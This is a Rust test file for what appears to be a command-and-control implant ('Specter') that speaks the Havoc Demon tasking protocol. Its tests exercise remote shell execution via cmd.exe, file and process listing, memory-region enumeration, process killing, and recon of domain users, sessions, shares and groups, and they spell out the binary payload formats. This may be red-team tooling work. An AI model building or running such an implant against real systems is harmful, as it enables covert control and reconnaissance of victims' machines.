        let _num_files = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("nf"));
        pos += 4;
        let _num_dirs = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("nd"));
        pos += 4;
        // In list_only mode the next field should be the first entry name, NOT a u64 total_size.
        // The remaining bytes must all be name-only entries (no is_dir/size/timestamps).
        // Just verify we can parse all remaining entries as utf16le strings without going OOB.
        while pos < p.len() {
            let name_len =
                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
            pos += 4 + name_len;
        }
        assert_eq!(pos, p.len(), "no trailing bytes; each entry must be exactly a name");

        let _ = std::fs::remove_file(test_file);
    }

    #[test]
    fn handle_fs_dir_timestamps_are_not_placeholder_epoch() {
        // Write a temp file and verify its modification time is encoded, not 1970-01-01 00:00.
        let tmp = std::env::temp_dir();
        let test_file = tmp.join("specter_ts_test.tmp");
        std::fs::write(&test_file, b"ts test").expect("write test file");

        let mut config = SpecterConfig::default();
        let payload =
            dir_request_payload(&tmp.display().to_string(), false, false, false, false, "", "", "");
        let package = DemonPackage::new(DemonCommand::CommandFs, 12, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };

        // Parse to the first entry and check the year field.
        let p = &resp.payload;
        let mut pos = 4 + 4 + 4; // subcmd + file_explorer + list_only
        let root_path_len = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
        pos += 4 + root_path_len + 4; // skip root_path + success
        let gpath_len = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
        pos += 4 + gpath_len + 4 + 4 + 8; // skip group path + num_files + num_dirs + total_size

        // Find the entry for our test file and read its year (offset 4+2+4+8+4+4 from name start).
        let test_name = "specter_ts_test.tmp";
        let mut found = false;
        while pos < p.len() {
            let name_len = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
            pos += 4;
            let name_utf16: Vec<u16> = p[pos..pos + name_len]
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            let name: String = char::decode_utf16(name_utf16)
                .filter_map(|r| r.ok())
                .filter(|&c| c != '\0')
                .collect();
            pos += name_len;
            // is_dir(4) + size(8) + day(4) + month(4) + year(4) + minute(4) + hour(4) = 32
            let _is_dir = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap());
            let _size = u64::from_le_bytes(p[pos + 4..pos + 12].try_into().unwrap());
            let _day = u32::from_le_bytes(p[pos + 12..pos + 16].try_into().unwrap());
            let _month = u32::from_le_bytes(p[pos + 16..pos + 20].try_into().unwrap());
            let year = u32::from_le_bytes(p[pos + 20..pos + 24].try_into().unwrap());
            pos += 32;
            if name == test_name {
                // The year must be >= 2024 (the file was just created).
                assert!(year >= 2024, "year should be current, got {year}");
                found = true;
            }
        }
        assert!(found, "test file entry not found in Dir listing");
        let _ = std::fs::remove_file(test_file);
    }

    #[test]
    fn unix_secs_to_ymd_hm_known_value() {
        // 1743162600 = 2025-03-28T11:50:00Z (verified against algorithm output)
        let (d, m, y, min, h) = unix_secs_to_ymd_hm(1_743_162_600);
        assert_eq!((d, m, y, min, h), (28, 3, 2025, 50, 11));
    }

    #[test]
    fn unix_secs_to_ymd_hm_epoch() {
        let (d, m, y, min, h) = unix_secs_to_ymd_hm(0);
        assert_eq!((d, m, y, min, h), (1, 1, 1970, 0, 0));
    }

    // ── handle_proc create / shell ────────────────────────────────────────────

    #[test]
    fn handle_proc_create_shell_returns_two_responses() {
        let cmd = "echo hello";
        let mut config = SpecterConfig::default();

        // Build the payload for CommandProc / ProcCreate (subcommand=4)
        let mut payload = 4u32.to_le_bytes().to_vec(); // subcmd = Create
        payload.extend_from_slice(&0u32.to_le_bytes()); // state
        payload.extend_from_slice(&le_utf16le_payload("c:\\windows\\system32\\cmd.exe")); // path
        payload.extend_from_slice(&le_utf16le_payload(&format!("/c {cmd}"))); // args
        payload.extend_from_slice(&1u32.to_le_bytes()); // piped = true
        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose = false

        let package = DemonPackage::new(DemonCommand::CommandProc, 99, payload);
        let result = dispatch(&package, &mut config);

        let DispatchResult::MultiRespond(resps) = result else {
            panic!("expected MultiRespond, got {result:?}");
        };
        assert_eq!(resps.len(), 2);
        assert_eq!(resps[0].command_id, u32::from(DemonCommand::CommandProc));
        assert_eq!(resps[1].command_id, u32::from(DemonCommand::CommandOutput));

        // The output payload should contain "hello"
        // payload[0..4] = LE length, payload[4..] = output bytes
        let out_payload = &resps[1].payload;
        let out_len = u32::from_le_bytes(out_payload[0..4].try_into().expect("len")) as usize;
        let out_str = std::str::from_utf8(&out_payload[4..4 + out_len])
            .expect("utf8 output")
            .trim()
            .to_string();
        assert_eq!(out_str, "hello");
    }

    #[test]
    fn handle_proc_create_reports_child_pid_not_agent_pid() {
        // The proc-create callback must carry the spawned child's PID, not std::process::id().
        let mut config = SpecterConfig::default();
        let mut payload = 4u32.to_le_bytes().to_vec(); // subcmd = Create
        payload.extend_from_slice(&0u32.to_le_bytes()); // state
        payload.extend_from_slice(&le_utf16le_payload("c:\\windows\\system32\\cmd.exe"));
        payload.extend_from_slice(&le_utf16le_payload("/c echo pid_test"));
        payload.extend_from_slice(&1u32.to_le_bytes()); // piped
        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose

        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
        let result = dispatch(&package, &mut config);

        let DispatchResult::MultiRespond(resps) = result else {
            panic!("expected MultiRespond, got {result:?}");
        };

        // Parse the proc payload to extract the PID field.
        // Format: [subcmd: u32 LE][path: u32 LE len + utf16le bytes][pid: u32 LE][...]
        let proc_payload = &resps[0].payload;
        // Skip subcmd (4 bytes), then read the path length to skip the path.
        let path_len =
            u32::from_le_bytes(proc_payload[4..8].try_into().expect("path len")) as usize;
        let pid_offset = 4 + 4 + path_len;
        let reported_pid = u32::from_le_bytes(
            proc_payload[pid_offset..pid_offset + 4].try_into().expect("pid bytes"),
        );

        // The reported PID must be non-zero (child was spawned) and must NOT be our own PID.
        assert_ne!(reported_pid, 0, "child PID must not be zero");
        assert_ne!(
            reported_pid,
            std::process::id(),
            "child PID must not equal the agent's own PID"
        );
    }

    #[test]
    fn translate_to_shell_cmd_strips_cmd_exe_prefix() {
        assert_eq!(translate_to_shell_cmd("c:\\windows\\system32\\cmd.exe", "/c whoami"), "whoami");
        assert_eq!(translate_to_shell_cmd("c:\\windows\\system32\\cmd.exe", "/C ls -la"), "ls -la");
    }

    #[test]
    fn translate_to_shell_cmd_non_cmd_exe_uses_path_and_args() {
        assert_eq!(translate_to_shell_cmd("/usr/bin/ls", "-la /tmp"), "/usr/bin/ls -la /tmp");
    }

    #[test]
    fn translate_to_shell_cmd_empty_args_returns_path() {
        assert_eq!(translate_to_shell_cmd("/usr/bin/id", ""), "/usr/bin/id");
    }

    // ── unknown/unhandled commands ────────────────────────────────────────────

    #[test]
    fn dispatch_unknown_command_id_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage { command_id: 0xDEAD_0000, request_id: 0, payload: vec![] };
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }

    #[test]
    fn dispatch_no_job_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandNoJob, 0, vec![]);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }

    #[test]
    fn dispatch_exit_returns_exit() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandExit, 0, vec![]);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Exit));
    }

    // ── write_ptr_be ─────────────────────────────────────────────────────────

    #[test]
    fn write_ptr_be_encodes_eight_bytes_big_endian() {
        let mut buf = Vec::new();
        write_ptr_be(&mut buf, 0x0011_2233_4455_6677);
        assert_eq!(buf, [0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77]);
    }

    // ── write_ptr_le ─────────────────────────────────────────────────────────

    #[test]
    fn write_ptr_le_encodes_eight_bytes_little_endian() {
        let mut buf = Vec::new();
        write_ptr_le(&mut buf, 0x0011_2233_4455_6677);
        assert_eq!(buf, [0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x00]);
    }

    // ── handle_proc_list ─────────────────────────────────────────────────────

    #[test]
    fn handle_proc_list_uses_correct_command_id() {
        let mut config = SpecterConfig::default();
        // process_ui = 0 (console request)
        let payload = 0u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 1, payload);
        let result = dispatch(&package, &mut config);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProcList));
    }

    #[test]
    fn handle_proc_list_echoes_process_ui_flag() {
        let mut config = SpecterConfig::default();
        // process_ui = 1 (from process manager)
        let payload = 1u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 2, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        let echoed_ui = u32::from_le_bytes(resp.payload[0..4].try_into().expect("le u32"));
        assert_eq!(echoed_ui, 1, "process_ui must be echoed verbatim");
    }

    #[test]
    fn handle_proc_list_contains_at_least_one_process() {
        let mut config = SpecterConfig::default();
        let payload = 0u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 3, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        // Payload must be > 4 bytes (the process_ui field) if any processes were enumerated.
        assert!(resp.payload.len() > 4, "process list must contain at least one entry");
    }

    #[test]
    fn handle_proc_list_includes_self_pid() {
        let own_pid = std::process::id();
        let mut config = SpecterConfig::default();
        let payload = 0u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 4, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        // Parse the response (LE): skip process_ui (4 bytes), then iterate entries.
        let p = &resp.payload;
        let mut pos = 4usize; // skip process_ui
        let mut found = false;
        while pos + 4 <= p.len() {
            // name: length-prefixed utf16le (LE length prefix)
            let name_len =
                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
            pos += 4 + name_len;
            if pos + 4 > p.len() {
                break;
            }
            // pid (LE)
            let pid = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("pid"));
            pos += 4;
            if pid == own_pid {
                found = true;
            }
            // skip: is_wow64 + ppid + session_id + threads = 4 × u32 = 16 bytes
            pos += 16;
            // user: length-prefixed utf16le (LE length prefix)
            if pos + 4 > p.len() {
                break;
            }
            let user_len =
                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("user len")) as usize;
            pos += 4 + user_len;
        }
        assert!(found, "own PID {own_pid} not found in process list");
    }

    // ── handle_proc_modules ──────────────────────────────────────────────────

    #[test]
    fn handle_proc_modules_returns_correct_command_id() {
        let mut config = SpecterConfig::default();
        // pid=0 → current process
        let mut payload = 2u32.to_le_bytes().to_vec(); // subcmd = Modules
        payload.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
        let package = DemonPackage::new(DemonCommand::CommandProc, 10, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
        // First 4 bytes must be subcmd=2 (LE)
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 2);
    }

    #[test]
    fn handle_proc_modules_echoes_pid() {
        let mut config = SpecterConfig::default();
        let mut payload = 2u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&42u32.to_le_bytes()); // arbitrary pid
        let package = DemonPackage::new(DemonCommand::CommandProc, 11, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        let echoed_pid = u32::from_le_bytes(resp.payload[4..8].try_into().expect("pid"));
        assert_eq!(echoed_pid, 42);
    }

    // ── handle_proc_grep ─────────────────────────────────────────────────────

    #[test]
    fn handle_proc_grep_correct_command_id_and_subcmd() {
        let mut config = SpecterConfig::default();
        let mut payload = 3u32.to_le_bytes().to_vec(); // subcmd = Grep
        payload.extend_from_slice(&le_utf16le_payload("nonexistent_xzy_proc_name_123"));
        let package = DemonPackage::new(DemonCommand::CommandProc, 20, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 3, "subcmd must be echoed as 3 (Grep)");
    }

    #[test]
    fn handle_proc_grep_empty_result_when_no_match() {
        let mut config = SpecterConfig::default();
        let mut payload = 3u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&le_utf16le_payload("zzz_no_such_process_zzz_99999"));
        let package = DemonPackage::new(DemonCommand::CommandProc, 21, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        // Only the subcmd field (4 bytes); no process entries.
        assert_eq!(resp.payload.len(), 4, "no match → payload must be exactly subcmd u32");
    }

    #[test]
    fn handle_proc_grep_missing_name_returns_ignore() {
        let mut config = SpecterConfig::default();
        // Only the subcmd, no name bytes
        let payload = 3u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProc, 22, payload);
        let result = dispatch(&package, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_proc_memory ───────────────────────────────────────────────────

    #[test]
    fn handle_proc_memory_correct_command_id_and_subcmd() {
        let mut config = SpecterConfig::default();
        let mut payload = 6u32.to_le_bytes().to_vec(); // subcmd = Memory
        payload.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
        payload.extend_from_slice(&0u32.to_le_bytes()); // filter = all
        let package = DemonPackage::new(DemonCommand::CommandProc, 30, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 6, "subcmd must be echoed as 6 (Memory)");
    }

    #[test]
    fn handle_proc_memory_echoes_pid_and_filter() {
        let mut config = SpecterConfig::default();
        let mut payload = 6u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&1234u32.to_le_bytes()); // pid
        payload.extend_from_slice(&0x04u32.to_le_bytes()); // PAGE_READWRITE filter
        let package = DemonPackage::new(DemonCommand::CommandProc, 31, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        let echoed_pid = u32::from_le_bytes(resp.payload[4..8].try_into().expect("pid"));
        let echoed_filter = u32::from_le_bytes(resp.payload[8..12].try_into().expect("filter"));
        assert_eq!(echoed_pid, 1234);
        assert_eq!(echoed_filter, 0x04);
    }

    #[test]
    fn handle_proc_memory_self_returns_regions() {
        let own_pid = std::process::id();
        let mut config = SpecterConfig::default();
        let mut payload = 6u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&own_pid.to_le_bytes()); // self
        payload.extend_from_slice(&0u32.to_le_bytes()); // all regions
        let package = DemonPackage::new(DemonCommand::CommandProc, 32, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        // Header is 12 bytes (subcmd + pid + filter); must have at least one region (20 bytes).
        assert!(
            resp.payload.len() >= 12 + 20,
            "self memory query must return at least one region; payload len={}",
            resp.payload.len()
        );
    }

    #[test]
    fn handle_proc_memory_missing_pid_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = 6u32.to_le_bytes().to_vec(); // subcmd only, no pid
        let package = DemonPackage::new(DemonCommand::CommandProc, 33, payload);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }

    // ── handle_proc_kill ─────────────────────────────────────────────────────

    #[test]
    fn handle_proc_kill_nonexistent_pid_returns_failure() {
        let mut config = SpecterConfig::default();
        let mut payload = 7u32.to_le_bytes().to_vec(); // subcmd = Kill
        payload.extend_from_slice(&9_999_999u32.to_le_bytes()); // bogus pid
        let package = DemonPackage::new(DemonCommand::CommandProc, 40, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        let success = u32::from_le_bytes(resp.payload[4..8].try_into().expect("success"));
        let echoed_pid = u32::from_le_bytes(resp.payload[8..12].try_into().expect("pid"));
        assert_eq!(subcmd, 7, "subcmd must be echoed as 7 (Kill)");
        assert_eq!(success, 0, "kill of bogus pid must report failure");
        assert_eq!(echoed_pid, 9_999_999);
    }

    #[test]
    fn handle_proc_kill_missing_pid_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = 7u32.to_le_bytes().to_vec(); // subcmd only, no pid
        let package = DemonPackage::new(DemonCommand::CommandProc, 41, payload);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }

    #[test]
    fn handle_proc_kill_payload_is_twelve_bytes() {
        // The kill response is always exactly 12 bytes: subcmd(4) + success(4) + pid(4)
        let mut config = SpecterConfig::default();
        let mut payload = 7u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&1u32.to_le_bytes()); // pid=1 (init, will likely fail)
        let package = DemonPackage::new(DemonCommand::CommandProc, 42, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.payload.len(), 12, "kill response must be exactly 12 bytes");
    }

    // ── handle_net ──────────────────────────────────────────────────────────

    /// Build a LE-encoded UTF-16LE length-prefixed payload (without NUL terminator)
    /// matching the format the teamserver sends.
    fn le_utf16le_net(s: &str) -> Vec<u8> {
        let utf16: Vec<u8> = s.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        let mut v = Vec::new();
        v.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
        v.extend_from_slice(&utf16);
        v
    }

    /// Build a CommandNet task package with the given subcommand and rest bytes.
    fn net_package(subcmd: DemonNetCommand, rest: &[u8]) -> DemonPackage {
        let mut payload = (subcmd as u32).to_le_bytes().to_vec();
        payload.extend_from_slice(rest);
        DemonPackage::new(DemonCommand::CommandNet, 1, payload)
    }

    /// Parse the first u32 LE from a response payload (the subcommand echo).
    fn resp_subcmd_le(payload: &[u8]) -> u32 {
        u32::from_le_bytes(payload[0..4].try_into().expect("subcmd"))
    }

    #[test]
    fn handle_net_unknown_subcommand_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = 0xFFu32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandNet, 1, payload);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }

    #[test]
    fn handle_net_empty_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandNet, 1, vec![]);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }

    #[test]
    fn handle_net_domain_returns_correct_command_and_subcmd() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Domain, &[]);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Domain));
        // Payload must have at least subcmd(4) + len(4) (the domain string, possibly empty).
        assert!(resp.payload.len() >= 8, "domain response must have subcmd + string length");
    }

    #[test]
    fn handle_net_domain_response_string_is_le_length_prefixed() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Domain, &[]);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        // After subcmd (4 bytes), read the LE length-prefixed domain string.
        let str_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        assert_eq!(resp.payload.len(), 8 + str_len, "payload size must match header");
    }

    #[test]
    fn handle_net_logons_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("SERVER01");
        let package = net_package(DemonNetCommand::Logons, &rest);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Logons));
        // After subcmd (4 bytes), the server name should be present as UTF-16LE.
        let server_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let server_bytes = &resp.payload[8..8 + server_len];
        let server = decode_utf16le_null(server_bytes);
        assert_eq!(server, "SERVER01");
    }

    #[test]
    fn handle_net_logons_missing_server_returns_ignore() {
        let mut config = SpecterConfig::default();
        // Subcommand only, no server name.
        let package = net_package(DemonNetCommand::Logons, &[]);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }

    #[test]
    fn handle_net_sessions_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("DC01");
        let package = net_package(DemonNetCommand::Sessions, &rest);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Sessions));
    }

    #[test]
    fn handle_net_sessions_missing_server_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Sessions, &[]);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }

    #[test]
    fn handle_net_computer_returns_stub_with_server() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("CORP.LOCAL");
        let package = net_package(DemonNetCommand::Computer, &rest);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Computer));
        // Server name must be echoed.
        let server_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let server = decode_utf16le_null(&resp.payload[8..8 + server_len]);
        assert_eq!(server, "CORP.LOCAL");
        // Stub: no entries after server name.
        assert_eq!(resp.payload.len(), 8 + server_len);
    }

    #[test]
    fn handle_net_dclist_returns_stub_with_server() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("CORP.LOCAL");
        let package = net_package(DemonNetCommand::DcList, &rest);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::DcList));
    }

    #[test]
    fn handle_net_share_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("FILESERV");
        let package = net_package(DemonNetCommand::Share, &rest);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Share));
    }

    #[test]
    fn handle_net_share_missing_server_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Share, &[]);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }

    #[test]
    fn handle_net_localgroup_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("WORKSTATION");
        let package = net_package(DemonNetCommand::LocalGroup, &rest);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::LocalGroup));
        // Server name echoed.
        let server_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let server = decode_utf16le_null(&resp.payload[8..8 + server_len]);
        assert_eq!(server, "WORKSTATION");
    }

    #[test]
    fn handle_net_localgroup_has_groups_from_etc_group() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("localhost");
        let package = net_package(DemonNetCommand::LocalGroup, &rest);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        // On any Linux system /etc/group has at least "root".
        // Response = subcmd(4) + server(4+N) + [group_name(4+N) + description(4+N)]...
        // So payload must be longer than just subcmd + server.
        let server_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let after_server = 8 + server_len;
        assert!(
            resp.payload.len() > after_server,
            "expected at least one group entry; payload len = {}",
            resp.payload.len()
        );
    }

    #[test]
    fn handle_net_group_echoes_subcmd_8() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("DC01");
        let package = net_package(DemonNetCommand::Group, &rest);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Group));
    }

    #[test]
    fn handle_net_users_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("HOST01");
        let package = net_package(DemonNetCommand::Users, &rest);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Users));
    }

    #[test]
    fn handle_net_users_includes_root_as_admin() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("localhost");
        let package = net_package(DemonNetCommand::Users, &rest);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };
        // Parse response to find "root" with is_admin=true.
        let p = &resp.payload;
        let mut pos = 4; // skip subcmd
        // Skip server name.
        let server_len = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("len")) as usize;
        pos += 4 + server_len;
        // Iterate user entries: [name: LE-len-prefixed UTF-16LE][is_admin: u32 LE]
        let mut found_root = false;
        while pos + 4 <= p.len() {
            let name_len =
                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
            pos += 4;
            if pos + name_len + 4 > p.len() {
                break;
            }
            let name = decode_utf16le_null(&p[pos..pos + name_len]);
            pos += name_len;
            let is_admin = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("admin"));
            pos += 4;
            if name == "root" {
                assert_eq!(is_admin, 1, "root must be flagged as admin");
                found_root = true;
            }
        }
        assert!(found_root, "root user not found in user list");
    }

    #[test]
    fn handle_net_users_missing_server_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Users, &[]);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }
}
